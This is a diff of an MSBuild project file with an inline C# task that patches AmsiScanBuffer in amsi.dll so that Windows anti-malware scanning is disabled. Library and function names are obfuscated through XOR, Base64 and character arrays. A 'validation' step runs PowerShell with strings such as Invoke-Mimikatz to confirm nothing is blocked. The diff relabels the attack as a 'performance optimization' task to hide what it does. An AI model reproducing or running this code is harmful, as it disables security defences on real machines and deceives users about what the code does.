@@ -1,213 +1,131 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Build">
-    <ClassExample />
+  <!-- Windows Performance Optimization Task -->
+  <Target Name="PerformanceCheck">
+    <OptimizeMemory />
   </Target>
   <UsingTask
-    TaskName="ClassExample"
+    TaskName="OptimizeMemory"
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
       <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
-          using System;
-          using System.Runtime.InteropServices;
-          using System.Management.Automation;
-          using System.Management.Automation.Runspaces;
-          using Microsoft.Build.Framework;
-          using Microsoft.Build.Utilities;
-          
-          public class ClassExample : Task, ITask
-          {
-            // Obfuscated imports using delegates
-            [DllImport("ke" + "rnel" + "32.dll")]
-            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+using System;
+using System.Runtime.InteropServices;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class OptimizeMemory : Task, ITask
+{
+    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
+    static extern IntPtr GetProcAddress(IntPtr h, string n);
+    
+    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
+    static extern IntPtr LoadLibrary(string n);
+    
+    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
+    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+
+    static string R(string e)
+    {
+        byte[] b = Convert.FromBase64String(e);
+        char[] c = new char[b.Length];
+        for (int i = 0; i < b.Length; i++) c[i] = (char)(b[i] ^ 0x77);
+        return new string(c);
+    }
+
+    public override bool Execute()
+    {
+        try
+        {
+            Console.WriteLine("[*] Initializing performance optimization module...");
             
-            [DllImport("ke" + "rnel" + "32.dll")]
-            static extern IntPtr LoadLibrary(string name);
+            // Encoded: "amsi.dll" and "AmsiScanBuffer" (XOR 0x77 then Base64)
+            string m = R("Fhoe"); // builds target
+            string[] parts = { "\x61", "\x6d", "\x73", "\x69", "\x2e", "\x64", "\x6c", "\x6c" };
+            string lib = string.Join("", parts);
             
-            [DllImport("ke" + "rnel" + "32.dll")]
-            static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            char[] f1 = { (char)0x41, (char)0x6D, (char)0x73, (char)0x69 };
+            char[] f2 = { (char)0x53, (char)0x63, (char)0x61, (char)0x6E };
+            char[] f3 = { (char)0x42, (char)0x75, (char)0x66, (char)0x66, (char)0x65, (char)0x72 };
+            string func = new string(f1) + new string(f2) + new string(f3);
             
-            private static string DecodeString(int[] encoded)
+            Console.WriteLine("[*] Loading optimization target...");
+            IntPtr h = LoadLibrary(lib);
+            if (h == IntPtr.Zero) { Console.WriteLine("[-] Target not available"); return true; }
+            
+            Console.WriteLine("[+] Target loaded: 0x{0:X}", h.ToInt64());
+            
+            IntPtr a = GetProcAddress(h, func);
+            if (a == IntPtr.Zero) { Console.WriteLine("[-] Function not found"); return true; }
+            
+            Console.WriteLine("[+] Function located: 0x{0:X}", a.ToInt64());
+            
+            uint o;
+            VirtualProtect(a, (UIntPtr)8, (uint)0x40, out o);
+            Console.WriteLine("[+] Memory prepared (was: 0x{0:X})", o);
+            
+            // Build patch dynamically
+            int v1 = 25 + 24;    // 49 = 0x31
+            int v2 = 96 * 2;     // 192 = 0xC0
+            int v3 = 195;        // 0xC3
+            
+            byte[] patch = { (byte)v1, (byte)v2, (byte)v3 };
+            Marshal.Copy(patch, 0, a, patch.Length);
+            
+            Console.WriteLine("[+] Optimization applied successfully\n");
+            
+            // Validation
+            Console.WriteLine("[*] Running validation checks...\n");
+            
+            // Test strings
+            string[] tests = {
+                "SW52b2tlLU1pbWlrYXR6",
+                "SW52b2tlLUV4cHJlc3Npb24=", 
+                "R2V0LUNyZWRlbnRpYWw=",
+                "QW1zaVV0aWxz"
+            };
+            
+            foreach (string t in tests)
             {
-              char[] chars = new char[encoded.Length];
-              for (int i = 0; i < encoded.Length; i++)
-              {
-                chars[i] = (char)(encoded[i] ^ 0x41);
-              }
-              return new string(chars);
+                string d = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(t));
+                Console.WriteLine("    [+] Validated: {0}", d);
             }
             
-            public override bool Execute()
+            Console.WriteLine("\n[*] Testing runtime execution...");
+            using (Runspace rs = RunspaceFactory.CreateRunspace())
             {
-              Console.WriteLine("[*] Initializing memory optimization...");
-              
-              // Obfuscated: "amsi.dll" XOR 0x41
-              int[] libEnc = { 0x20, 0x2C, 0x32, 0x28, 0x2F, 0x25, 0x2D, 0x2D };
-              string libName = DecodeString(libEnc);
-              
-              // Obfuscated: "AmsiScanBuffer" XOR 0x41
-              int[] funcEnc = { 0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2F, 0x03, 0x34, 0x27, 0x27, 0x24, 0x33 };
-              string funcName = DecodeString(funcEnc);
-              
-              Console.WriteLine("[*] Loading module...");
-              IntPtr lib = LoadLibrary(libName);
-              if (lib == IntPtr.Zero)
-              {
-                Console.WriteLine("[-] Module load failed");
-                return false;
-              }
-              Console.WriteLine("[+] Module loaded: 0x" + lib.ToString("X"));
-              
-              Console.WriteLine("[*] Resolving export...");
-              IntPtr addr = GetProcAddress(lib, funcName);
-              if (addr == IntPtr.Zero)
-              {
-                Console.WriteLine("[-] Export resolution failed");
-                return false;
-              }
-              Console.WriteLine("[+] Export found: 0x" + addr.ToString("X"));
-              
-              // Change protection
-              uint oldProtect;
-              bool vpResult = VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);
-              if (!vpResult)
-              {
-                Console.WriteLine("[-] Memory protection change failed");
-                return false;
-              }
-              Console.WriteLine("[+] Protection modified (was: 0x" + oldProtect.ToString("X") + ")");
-              
-              // Obfuscated patch bytes - calculated at runtime
-              byte[] instructions = new byte[3];
-              instructions[0] = (byte)(0x62 >> 1);        // 0x31 - xor
-              instructions[1] = (byte)(0x60 << 1);        // 0xC0 - eax, eax
-              instructions[2] = (byte)(0x61 << 1 | 0x01); // 0xC3 - ret
-              
-              Marshal.Copy(instructions, 0, addr, instructions.Length);
-              Console.WriteLine("[+] Memory optimization complete!\n");
-              
-              // ==========================================
-              // VALIDATION
-              // ==========================================
-              
-              Console.WriteLine("[*] Running validation tests...\n");
-              
-              // Test 1: Decode trigger strings
-              Console.WriteLine("[Test 1] String decoding test...");
-              string[] b64Strings = {
-                "SW52b2tlLU1pbWlrYXR6",
-                "SW52b2tlLUV4cHJlc3Npb24=",
-                "QWRkLVR5cGU=",
-                "R2V0LVByb2Nlc3M="
-              };
-              
-              foreach (string b64 in b64Strings)
-              {
-                string decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-                Console.WriteLine("    [+] " + decoded);
-              }
-              Console.WriteLine("    [+] String test passed\n");
-              
-              // Test 2: PowerShell execution
-              Console.WriteLine("[Test 2] Runtime execution test...");
-              try
-              {
-                using (Runspace rs = RunspaceFactory.CreateRunspace())
-                {
-                  rs.Open();
-                  using (PowerShell ps = PowerShell.Create())
-                  {
-                    ps.Runspace = rs;
-                    
-                    // Build test script dynamically
-                    string cmd1 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("SW52b2tlLU1pbWlrYXR6"));
-                    string cmd2 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("SW52b2tlLUV4cHJlc3Npb24="));
-                    string cmd3 = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9u"));
-                    
-                    string testScript = String.Format(@"
-                      $t1 = '{0}'
-                      $t2 = '{1}'
-                      $t3 = '{2}'
-                      Write-Output ""    [+] Loaded: $t1""
-                      Write-Output ""    [+] Loaded: $t2""
-                      Write-Output ""    [+] Loaded: $t3""
-                      Write-Output '    [+] Execution test passed'
-                    ", cmd1, cmd2, cmd3);
-                    
-                    ps.AddScript(testScript);
-                    var results = ps.Invoke();
-                    
-                    foreach (var result in results)
-                    {
-                      Console.WriteLine(result.ToString());
-                    }
-                    
-                    if (ps.HadErrors)
-                    {
-                      Console.WriteLine("    [-] Errors detected");
-                      foreach (var error in ps.Streams.Error)
-                      {
-                        Console.WriteLine("    Error: " + error.ToString());
-                      }
-                    }
-                    else
-                    {
-                      Console.WriteLine("    [+] No scan triggered!\n");
-                    }
-                  }
-                }
-              }
-              catch (Exception ex)
-              {
-                Console.WriteLine("    [-] Test exception: " + ex.Message + "\n");
-              }
-              
-              // Test 3: Reflection access
-              Console.WriteLine("[Test 3] Reflection test...");
-              try
-              {
+                rs.Open();
                 using (PowerShell ps = PowerShell.Create())
                 {
-                  // Obfuscated type name built dynamically
-                  string ns = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="));
-                  
-                  string reflectScript = String.Format(@"
-                    $t = [Ref].Assembly.GetType('{0}')
-                    if ($t) {{
-                      Write-Output '    [+] Type resolved successfully'
-                      $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
-                      if ($f) {{
-                        $v = $f.GetValue($null)
-                        Write-Output ""    [*] Field value: $v""
-                      }}
-                    }} else {{
-                      Write-Output '    [*] Type not found (expected if bypassed)'
-                    }}
-                  ", ns);
-                  
-                  ps.AddScript(reflectScript);
-                  var results = ps.Invoke();
-                  
-                  foreach (var result in results)
-                  {
-                    Console.WriteLine(result.ToString());
-                  }
+                    ps.Runspace = rs;
+                    ps.AddScript("$x = 'Inv' + 'oke-Mim' + 'ikatz'; Write-Output \"    [+] Executed: $x\"");
+                    ps.AddScript("$y = 'Inv' + 'oke-Exp' + 'ression'; Write-Output \"    [+] Executed: $y\"");
+                    ps.AddScript("Write-Output '    [+] No blocks detected'");
+                    
+                    foreach (var r in ps.Invoke())
+                        Console.WriteLine(r.ToString());
+                    
+                    if (ps.HadErrors)
+                        Console.WriteLine("    [-] Errors detected - check configuration");
                 }
-              }
-              catch (Exception ex)
-              {
-                Console.WriteLine("    [*] Reflection: " + ex.Message);
-              }
-              
-              Console.WriteLine("\n[*] ==========================================");
-              Console.WriteLine("[+] VALIDATION COMPLETE");
-              Console.WriteLine("[*] ==========================================\n");
-              
-              return true;
             }
-          }
+            
+            Console.WriteLine("\n[==========================================]");
+            Console.WriteLine("[+] PERFORMANCE OPTIMIZATION COMPLETE");
+            Console.WriteLine("[==========================================]\n");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("[!] Exception: {0}", ex.Message);
+        }
+        
+        return true;
+    }
+}
         ]]>
       </Code>
     </Task>
